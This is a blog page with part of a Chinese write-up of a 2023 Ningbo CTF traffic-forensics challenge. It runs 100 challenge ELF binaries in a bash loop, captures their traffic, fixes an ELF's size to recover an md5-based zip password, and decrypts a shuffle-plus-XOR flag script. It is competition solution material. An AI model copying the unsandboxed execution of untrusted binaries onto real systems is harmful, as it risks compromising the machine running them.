+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-2.png"></p>
+<p>共提取出100个elf文件，且每个elf文件运行后都会打印一个md5值</p>
+<p>使用tcpdump监听后运行所有elf文件<br><code>tcpdump -tttt -s0 -X -vv -w t.pcap</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用find命令查找当前文件夹下所有的elf文件</span><br>elf_files=$(find . -maxdepth 1 -type f -executable -name &quot;*.elf&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用循环依次执行每一个elf文件</span><br>for file in $elf_files<br>do<br>  echo &quot;Executing $file&quot;<br>  ./$file<br>done<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-3.png"></p>
+<p>分析<code>t.pcap</code>文件，发现只有<code>22E7CF.elf</code>访问了<code>192.168.3.201</code>这个ip</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-4.png"></p>
+<p>将文件md5和地址拼接后解压提示密码错误，是因为tcp传输文件会有冗余，需要计算elf文件的真正大小</p>
+<p>readelf读文件</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-5.png"></p>
+<p>得到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Start of section headers:          14736 (bytes into file)<br>Size of section headers:           64 (bytes)<br>Number of section headers:         30<br></code></pre></td></tr></table></figure>
+
+<p>参考文章：<a target="_blank" rel="noopener" href="https://luomuxiaoxiao.com/?p=139">计算机原理系列之二 ——– 详解ELF文件</a></p>
+<p>计算得到<code>14736+64*30=16656字节</code></p>
+<p>16656即4110(16进制)，将冗余的数据去除</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-6.png"></p>
+<p>计算真正的md5</p>
+<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/hacker_traffic-7.png"></p>
+<p>拼接起来，得到<code>0f82ecb23adc35a4a5e3d8bdabbafe15192.168.3.201</code></p>
+<p>解压得到一个py脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> secret<br>key = <span class="hljs-string">&quot;x.x.x.x&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_flag</span>(<span class="hljs-params">flag, key</span>):<br>    random.seed(key)<br>    table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>    random.shuffle(table)<br>    flag = [flag[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> table]<br>    ascii_flag = [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> flag]<br>    random.seed(key)<br>    xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    encrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> ascii_flag]<br>    <span class="hljs-keyword">return</span> base64.b64encode(<span class="hljs-built_in">bytes</span>(encrypted_flag)).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-built_in">print</span>(encrypt_flag(flag, key))<br><span class="hljs-comment"># VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=</span><br></code></pre></td></tr></table></figure>
+
+<p>伪随机+shuffle生成s盒进行的置换异或加密</p>
+<p>根据<code>key=&quot;x.x.x.x&quot;</code>可知key就是ip地址，为<code>192.168.3.201</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag, key</span>):<br>   random.seed(key)<br>   table = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>))<br>   random.shuffle(table)<br>   <span class="hljs-comment"># 解码base64编码的字符串</span><br>   encrypted_flag = base64.b64decode(encrypted_flag.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><br>   <span class="hljs-comment"># 随机生成一个密钥</span><br>   random.seed(key)<br>   xor_key = random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br><br>   <span class="hljs-comment"># 对加密后的ASCII码列表进行异或运算</span><br>   decrypted_flag = [c ^ xor_key <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> encrypted_flag]<br><br>   <span class="hljs-comment"># 将异或后的ASCII码列表转换成字符列表</span><br>   flag = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> decrypted_flag])<br>   final_flag = [<span class="hljs-number">0</span>]*<span class="hljs-number">38</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table)):<br>       final_flag[table[i]] = flag[i]<br><br>   <span class="hljs-comment"># 返回解密后的flag字符串</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(final_flag)<br><br>key = <span class="hljs-string">&quot;192.168.3.201&quot;</span><br>text = <span class="hljs-string">&#x27;VFVWU1kGBgIMUlMBVFcBBgRRBFAHVFBVUFkbUB0DAQMEBVIGAlE=&#x27;</span><br>flag = decrypt_flag(text, key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/wp/" class="category-chain-item">wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/">#wp</a>
+      
+        <a href="/tags/2023/">#2023</a>
+      
+        <a href="/tags/%E5%AE%81%E6%B3%A2/">#宁波</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023宁波市赛wp</div>
+      <div>https://www.dr0n.top/posts/2d3983d/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>dr0n</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年5月20日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                <i class="iconfont icon-nc"></i>
+              </span>
+              </a>
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+              <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                <i class="iconfont icon-nd"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/posts/6118732e/" title="AWD攻击与防御">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">AWD攻击与防御</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/posts/2109a2ab/" title="hw面试题">
+                        <span class="hidden-mobile">hw面试题</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments">
+    
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://lib.baomitu.com/waline/2.5.1/waline.min.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/waline/2.5.1/waline.min.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline.dr0n.top/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["//unpkg.com/@waline/emojis@1.0.1/qq","//unpkg.com/@waline/emojis@1.0.1/bilibili"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2022002247号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  
+    <script>
+        function page_time(){
+            var times = document.getElementsByTagName('time');
+            if (times.length === 0) { return; }
+            var posts = document.getElementsByClassName('post-content');
+            console.log(posts);
+            if (posts.length === 0) { return; }    
+            var pubTime = new Date(times[0].dateTime);  /* 文章发布时间戳 */
+            var now = Date.now()  /* 当前时间戳 */
+            var interval = parseInt(now - pubTime)
+            /* 发布时间超过指定时间（毫秒） */
+            if (interval > 3600*24*30*1500){
+                var days = parseInt(interval / 86400000)
+                posts[0].innerHTML = '<div class="note note-warning" style="font-size:0.9rem"><p>' +
+                '<div class="h6">文章时效性提示</div><p>这是一篇发布于 ' + days + ' 天前的文章，部分信息可能已发生改变，请注意甄别。' +
+                '</p></p></div>' + posts[0].innerHTML;
+            }
+        }
+        page_time();
+    </script>
+  
+  
+  
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?150aacf9a16405ad4ea9ead54ecac598";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
